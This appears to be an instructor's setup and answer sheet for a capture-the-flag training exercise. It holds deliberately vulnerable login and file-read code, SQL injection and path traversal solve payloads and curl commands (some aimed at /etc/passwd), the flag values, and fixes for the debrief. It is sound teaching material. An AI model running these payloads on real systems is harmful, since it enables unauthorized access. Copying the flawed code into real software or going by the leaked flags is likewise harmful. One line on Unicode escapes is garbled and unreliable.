# 🧩 Lab Setup Reference — Vulnerable Code, Vulnerable Lines & Flags

Setup sheet for the security-awareness exercise. **Two attack vectors only: SQL Injection and Path Traversal.**
For each lab: the vulnerable source snippet, the exact vulnerable line(s), why it's exploitable, and the CTF flag.

| # | Lab | Vector | Endpoint | Flag |
|---|-----|--------|----------|------|
| 0 | Login (NIGHTFALL) | SQL Injection | `/` (POST) | `CTF{8ee4d84cbeef15123c24791da26006d9}` |
| 1 | Basic Traversal | Path Traversal | `/dr-strange?filename=` | `CTF{75c4bcd59149b3004345e414c325f3b6}` |
| 2 | Dot-Segment | Path Traversal | `/captain-america?filename=` | `CTF{234b5a3edf97aa319646be27d8a89db0}` |
| 3 | Blacklist + 2× decode | Path Traversal | `/deadpool?filename=` | `CTF{2c7c8d5ec9db726a120b290922222e47}` |
| 4 | Unicode escape | Path Traversal | `/goku?filename=` | `CTF{fb4f3b1240b02c9c9efd10a01777d13f}` |

> Flags live in `./flags/*.txt` (mounted into the containers). Re-randomize any time:
> `for i in 1 2 3 4; do printf 'CTF{%s}\n' "$(openssl rand -hex 16)" > flags/flag$i.txt; done`
> and `printf 'CTF{%s}\n' "$(openssl rand -hex 16)" > flags/flag_login.txt`

---

## 🩸 Challenge 0 — SQL Injection (Authentication Bypass)

- **Source file:** `login-app/index.php`
- **Endpoint:** `POST /` — fields `username`, `password`
- **Flag:** `CTF{8ee4d84cbeef15123c24791da26006d9}` (`flags/flag_login.txt`)

**Vulnerable snippet:**
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // user input concatenated straight into the SQL string — no parameterization
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";   // ◀ VULNERABLE

    $result = $db->query($query);
    $user = $result ? $result->fetch(PDO::FETCH_ASSOC) : false;
    if ($user) { /* authenticated */ }
}
```

- **Exact vulnerable line** (`login-app/index.php:46`):
  ```php
  $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
  ```
- **Why:** `$username` / `$password` are concatenated directly into SQL. Input like `admin'-- ` closes the string and comments out the password check.

**Solve payloads** (username field):
| Payload | Effect |
|---|---|
| `admin'-- ` | logs in as admin (comments out password check) |
| `' OR '1'='1` | tautology, returns first user |

```bash
curl -s -X POST "http://<host>/" --data-urlencode "username=admin'-- -" --data-urlencode "password=x"
```

**Fix:** parameterized query — `WHERE username = ? AND password = ?` — and store salted password hashes.

---

## 📂 Level 1 — `/dr-strange` (Basic Path Traversal, no protection)

- **Source file:** `ChallengesController.java` → `readFile()`
- **Flag:** `CTF{75c4bcd59149b3004345e414c325f3b6}` (`flags/flag1.txt`, read as `../flag1.txt`)

```java
private static final String UPLOAD_DIR = "uploads/";

@GetMapping("/dr-strange")
public String readFile(@RequestParam String filename, Model model) {
    try {
        Path filePath = Paths.get(UPLOAD_DIR + filename);   // ◀ VULNERABLE — no validation
        String content = Files.readString(filePath);
        model.addAttribute("content", content);
    } catch (Exception e) {
        model.addAttribute("error", "File not found or cannot be read: " + e.getMessage());
    }
    return "file-content";
}
```

- **Exact vulnerable line:**
  ```java
  Path filePath = Paths.get(UPLOAD_DIR + filename);
  ```
- **Why:** the raw `filename` is concatenated onto the base dir with no filtering, so `../` escapes `uploads/`.

**Solve:** `../flag1.txt` · `../../../../../../etc/passwd`
```bash
curl "http://<host>/dr-strange?filename=../flag1.txt"
```

---

## 🧱 Level 2 — `/captain-america` (Dot-Segment / broken sanitizer)

- **Source file:** `ChallengesController.java` → `secureRead2()`
- **Flag:** `CTF{234b5a3edf97aa319646be27d8a89db0}` (`flags/flag2.txt`, read as `../flag2.txt`)

```java
@GetMapping("/captain-america")
public String secureRead2(@RequestParam String filename, Model model) {
    try {
        String processedFilename = filename.replace("../", "");   // ◀ VULNERABLE — single, non-recursive pass
        Path filePath = Paths.get(UPLOAD_DIR + processedFilename);
        String content = Files.readString(filePath);
        model.addAttribute("content", content);
    } catch (Exception e) {
        model.addAttribute("error", "File not found or cannot be read: " + e.getMessage());
    }
    return "file-content";
}
```

- **Exact vulnerable line:**
  ```java
  String processedFilename = filename.replace("../", "");
  ```
- **Why:** `replace("../","")` runs **once** and isn't re-applied to its own output. `....//` → after removing the inner `../` → `../`.

**Solve:** `....//flag2.txt` · `....//....//....//....//....//....//etc/passwd`
```bash
curl "http://<host>/captain-america?filename=....//flag2.txt"
```

---

## 🔒 Level 3 — `/deadpool` (Blacklist checked before a 2nd decode)

- **Source file:** `ChallengesController.java` → `secureRead()` + `containsBlacklistedItem()`
- **Flag:** `CTF{2c7c8d5ec9db726a120b290922222e47}` (`flags/flag3.txt`, read as `../flag3.txt`)

```java
private static final List<String> BLACKLIST = Arrays.asList(
    "../", "..\\", "..", "passwd", "shadow", "hosts", "config", "flag.txt"
);

@GetMapping("/deadpool")
public String secureRead(@RequestParam String filename, Model model) {
    try {
        if (containsBlacklistedItem(filename)) {                              // ◀ blacklist runs on RAW input …
            model.addAttribute("error", "Access denied: Blacklisted characters detected!");
            return "file-content";
        }
        String decodedFilename = URLDecoder.decode(filename, StandardCharsets.UTF_8);   // ◀ … then decodes AGAIN
        Path filePath = Paths.get(UPLOAD_DIR + decodedFilename);             // ◀ VULNERABLE — uses decoded value
        String content = Files.readString(filePath);
        model.addAttribute("content", content);
    } catch (Exception e) {
        model.addAttribute("error", "File not found or cannot be read: " + e.getMessage());
    }
    return "file-content";
}

private boolean containsBlacklistedItem(String filename) {
    String lowerFilename = filename.toLowerCase();
    return BLACKLIST.stream().anyMatch(lowerFilename::contains);
}
```

- **Exact vulnerable lines:** the blacklist is applied to the pre-decode string, then `URLDecoder.decode(...)` reconstructs traversal characters that the check never saw:
  ```java
  if (containsBlacklistedItem(filename)) { ... }                       // checks BEFORE decode
  String decodedFilename = URLDecoder.decode(filename, StandardCharsets.UTF_8);
  Path filePath = Paths.get(UPLOAD_DIR + decodedFilename);
  ```
- **Why:** Spring already URL-decodes the query param **once**, so single-encoding arrives as literal `../` and is blocked. **Double-encode** so the blacklist sees harmless text and the app's own `URLDecoder.decode` rebuilds the traversal.

**Solve** (double-encoded; `../` → `%252e%252e%252f`):
```bash
# flag3 (filename isn't blacklisted, only ../ needs double-encoding)
curl "http://<host>/deadpool?filename=%252e%252e%252fflag3.txt"

# /etc/passwd  (encode 'passwd' too since it's blacklisted)
curl "http://<host>/deadpool?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252f%2570%2561%2573%2573%2577%2564"
```

---

## 🌐 Level 4 — `/goku` (Unicode escape decoding)

- **Source file:** `ChallengesController.java` → `secureRead4()` + `decodeUnicode()`
- **Flag:** `CTF{fb4f3b1240b02c9c9efd10a01777d13f}` (`flags/flag4.txt`, read as `../flag4.txt`)

```java
@GetMapping("/goku")
public String secureRead4(@RequestParam String filename, Model model) {
    try {
        String decodedFilename = decodeUnicode(filename);                          // ◀ un-escapes \uXXXX
        Path filePath = Paths.get(UPLOAD_DIR).resolve(decodedFilename).normalize(); // ◀ VULNERABLE
        String content = Files.readString(filePath);
        model.addAttribute("content", content);
    } catch (Exception e) {
        model.addAttribute("error", "File not found or cannot be read: " + e.getMessage());
    }
    return "file-content";
}

private String decodeUnicode(String input) throws Exception {
    Properties props = new Properties();
    props.load(new StringReader("key=" + input));   // ◀ Properties parses \uXXXX escapes
    return props.getProperty("key");
}
```

- **Exact vulnerable lines:**
  ```java
  String decodedFilename = decodeUnicode(filename);
  Path filePath = Paths.get(UPLOAD_DIR).resolve(decodedFilename).normalize();
  ```
  and inside `decodeUnicode`:
  ```java
  props.load(new StringReader("key=" + input));   // Java Properties decodes . etc.
  ```
- **Why:** input is Unicode-unescaped before the read. `.` = `.`, `/` = `/`, so `../` = `../`. Send the backslash URL-encoded as `%5c`.

**Solve:** browser `../flag4.txt` · curl (backslash as `%5c`):
```bash
curl "http://<host>/goku?filename=%5cu002e%5cu002e%5cu002fflag4.txt"
```

---

## Common remediation (for the debrief)

| Anti-pattern in the labs | Fix |
|---|---|
| Concatenating input into SQL (`'$user'`) | Parameterized queries / prepared statements |
| Concatenating input into a file path (`UPLOAD_DIR + filename`) | Canonicalize (`toRealPath()`/`normalize()`) then assert it stays under the base dir |
| Single-pass `replace("../","")` | Never sanitize by string removal; validate the *resolved* path |
| Blacklists (`../`, `passwd`, …) | Whitelist known-good filenames; reject everything else |
| Validating before decoding | Decode fully **first**, then validate the final value |

---

## Quick reference — run the stack

```bash
docker compose -f docker-compose-ec2.yml up -d      # start all containers
# Login (SQLi):     http://<host>/
# Path traversal:   http://<host>/dr-strange | /captain-america | /deadpool | /goku
```
Replace `<host>` with `localhost` locally or the EC2 public IP in the exercise.
